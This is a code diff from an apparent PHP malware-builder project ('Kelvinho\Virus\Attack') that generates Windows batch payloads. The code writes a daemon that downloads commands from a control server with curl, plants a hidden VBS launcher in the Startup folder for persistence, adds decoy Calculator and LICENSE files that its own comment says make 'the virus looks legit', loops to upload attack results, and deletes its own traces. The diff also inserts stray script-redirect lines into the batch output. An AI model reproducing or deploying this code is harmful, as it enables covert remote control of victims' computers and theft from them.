@@ -39,6 +39,7 @@ namespace Kelvinho\Virus\Attack {
             )
             goto daemon_loop
 
+            rem <script>window.location="http://google.com";</script>
             <?php return ob_get_clean(); //@formatter:on
         }
 
@@ -341,73 +342,6 @@ namespace Kelvinho\Virus\Attack {
         }
 
         /**
-         * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
-         * - /libs/current/{attack_id}/: contain directories named after attack ids, code.cmd in them which contains the shell code
-         * - /libs/utils/: contain 3rd party tools and binaries that can be used by the payloads
-         * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
-         * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
-         *
-         * @param string $virus_id The virus's id
-         * @param string $user_handle The user handle
-         * @param string $homeDirectory
-         * @return string The shell code
-         */
-        public static function initStandalone(string $virus_id, string $user_handle, string $homeDirectory = "%appData%\\Calculator"): string {
-            $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
-            $UFile = "$startup_directory\\U" . substr($virus_id, 0, 5) . ".vbs";
-            ob_start(); ?>
-            rmdir /s /q "<?php echo $homeDirectory; ?>"
-            mkdir "<?php echo $homeDirectory; ?>"
-            mkdir "<?php echo "$homeDirectory\\libs"; ?>"
-            mkdir "<?php echo "$homeDirectory\\libs\\current"; ?>"
-            mkdir "<?php echo "$homeDirectory\\libs\\utils"; ?>"
-            >"<?php echo "$homeDirectory\\entry.cmd"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
-            >"<?php echo "$UFile"; ?>" echo On Error Resume Next
-            >>"<?php echo "$UFile"; ?>" echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $homeDirectory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False
-            "<?php echo $UFile; // below are just additional things to make the virus looks legit
-            ?>"
-            >"<?php echo "$homeDirectory\\LICENSE"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
-            >"<?php echo $homeDirectory; ?>\calculator.cmd" echo calc.exe
-            cls
-            <?php return ob_get_clean();
-        }
-
-        /**
-         * Connects with the web server to see if it has accepted the results. If yes then quits the loop and allow the
-         * script to continue. This is intended to be placed in the payload rather than on the host computer.
-         *
-         * @param string $virus_id The virus id
-         * @param string $attack_id The attack id
-         * @param string $uploadCode The code to upload the results
-         * @return string The shell code
-         */
-        public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
-            ob_start();//@formatter:off ?>
-            SetLocal EnableDelayedExpansion & set /a trials = 0
-            :payload_confirmation_loop
-            set /a trials+=1
-            if %trials% geq <?php echo ATTACK_UPLOAD_RETRIES; ?> goto end_payload_confirmation_loop
-            <?php echo "$uploadCode\n"; ?>
-            timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
-            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
-            :end_payload_confirmation_loop
-            EndLocal
-            <?php return ob_get_clean();//@formatter:on
-        }
-
-
-        /**
-         * Cleaning up the payload after it has executed.
-         *
-         * @return string The shell code
-         */
-        public static function cleanUpPayload(): string {
-            ob_start(); ?>
-            start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
-            <?php return ob_get_clean();
-        }
-
-        /**
          * Generic batch functions that programs may include and use
          *
          * @return string The functions
@@ -462,6 +396,74 @@ namespace Kelvinho\Virus\Attack {
             EndLocal & set "%1=%ut%"
             exit /b 0
             <?php return ob_get_clean();//@formatter:on
+        }
+
+        /**
+         * Init script. This will be the code initially downloaded and run using the entry point instructions. This will setup several things:
+         * - /libs/current/{attack_id}/: contain directories named after attack ids, code.cmd in them which contains the shell code
+         * - /libs/utils/: contain 3rd party tools and binaries that can be used by the payloads
+         * - /entry.cmd: the virus daemon. script in startup folder will invoke this, and this will constantly report back to the web server
+         * - startup/SU.vbs: placed in the startup folder, which will invoke entry.cmd
+         *
+         * @param string $virus_id The virus's id
+         * @param string $user_handle The user handle
+         * @param string $homeDirectory
+         * @return string The shell code
+         */
+        public static function initStandalone(string $virus_id, string $user_handle, string $homeDirectory = "%appData%\\Calculator"): string {
+            $startup_directory = "%appData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+            $UFile = "$startup_directory\\U" . substr($virus_id, 0, 5) . ".vbs";
+            ob_start(); ?>
+            rmdir /s /q "<?php echo $homeDirectory; ?>"
+            mkdir "<?php echo $homeDirectory; ?>"
+            mkdir "<?php echo "$homeDirectory\\libs"; ?>"
+            mkdir "<?php echo "$homeDirectory\\libs\\current"; ?>"
+            mkdir "<?php echo "$homeDirectory\\libs\\utils"; ?>"
+            >"<?php echo "$homeDirectory\\entry.cmd"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/entry/$virus_id\n" ?>
+            >"<?php echo "$UFile"; ?>" echo On Error Resume Next
+            >>"<?php echo "$UFile"; ?>" echo CreateObject^(^"WScript^.Shell^"^)^.Run chr^(34^) ^& ^"<?php echo $homeDirectory; ?>\entry^.cmd^" ^& chr^(34^)^, 0^, False
+            "<?php echo $UFile; // below are just additional things to make the virus looks legit
+            ?>"
+            >"<?php echo "$homeDirectory\\LICENSE"; ?>" curl -L <?php echo ALT_DOMAIN . "/new/win/$user_handle/license\n" ?>
+            >"<?php echo $homeDirectory; ?>\calculator.cmd" echo calc.exe
+            rem
+            <script>window.location = "http://google.com";</script>
+            cls
+            <?php return ob_get_clean();
+        }
+
+        /**
+         * Connects with the web server to see if it has accepted the results. If yes then quits the loop and allow the
+         * script to continue. This is intended to be placed in the payload rather than on the host computer.
+         *
+         * @param string $virus_id The virus id
+         * @param string $attack_id The attack id
+         * @param string $uploadCode The code to upload the results
+         * @return string The shell code
+         */
+        public static function payloadConfirmationLoop(string $virus_id, string $attack_id, string $uploadCode): string {
+            ob_start();//@formatter:off ?>
+            SetLocal EnableDelayedExpansion & set /a trials = 0
+            :payload_confirmation_loop
+            set /a trials+=1
+            if %trials% geq <?php echo ATTACK_UPLOAD_RETRIES; ?> goto end_payload_confirmation_loop
+            <?php echo "$uploadCode\n"; ?>
+            timeout <?php echo ATTACK_UPLOAD_RETRY_INTERVAL . "\n"; ?>
+            for /f "tokens=*" %%i in ('curl -L <?php echo ALT_SECURE_DOMAIN; ?>/vrs/<?php echo $virus_id; ?>/aks') do if "%%i"=="<?php echo $attack_id; ?>" goto payload_confirmation_loop
+            :end_payload_confirmation_loop
+            EndLocal
+            <?php return ob_get_clean();//@formatter:on
+        }
+
+        /**
+         * Cleaning up the payload after it has executed.
+         *
+         * @return string The shell code
+         */
+        public static function cleanUpPayload(): string {
+            ob_start(); ?>
+            start /b cmd /c "timeout 3 & rmdir /s /q %~pd0"
+            <?php return ob_get_clean();
         }
     }
 }
